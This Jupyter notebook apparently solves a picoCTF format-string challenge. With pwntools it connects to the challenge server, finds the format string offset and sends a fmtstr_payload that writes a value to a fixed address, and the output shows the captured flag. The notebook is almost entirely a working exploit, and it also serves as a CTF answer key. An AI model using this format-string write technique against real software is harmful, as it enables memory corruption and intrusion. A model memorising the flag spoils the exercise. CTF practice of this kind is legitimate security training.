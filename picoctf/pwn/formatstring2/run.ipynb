{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pwn import *\n",
    "\n",
    "context.log_level = \"critical\"\n",
    "context.binary = ELF('./vuln')\n",
    "def exec_fmt(payload):\n",
    "    r = remote('rhea.picoctf.net', 51891)\n",
    "    r.recvuntil(b\"What do you have to say?\")\n",
    "    r.sendline(payload)\n",
    "    return r.recvall()\n",
    "\n",
    "autofmt = FmtStr(exec_fmt)\n",
    "offset = autofmt.offset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "metadata": {},
   "outputs": [],
   "source": [
    "payload = fmtstr_payload(14, {0x00404060: 0x67616c66})"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b\"\\nHere's your input:                                                                                                      u\\x00    \\x00                                                                                                                                                                                                                                                    \\x00aaaa`@@\\nI have NO clue how you did that, you must be a wizard. Here you go...\\npicoCTF{f0rm47_57r?_f0rm47_m3m_5161a699}\""
      ]
     },
     "execution_count": 54,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "exec_fmt(payload)\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
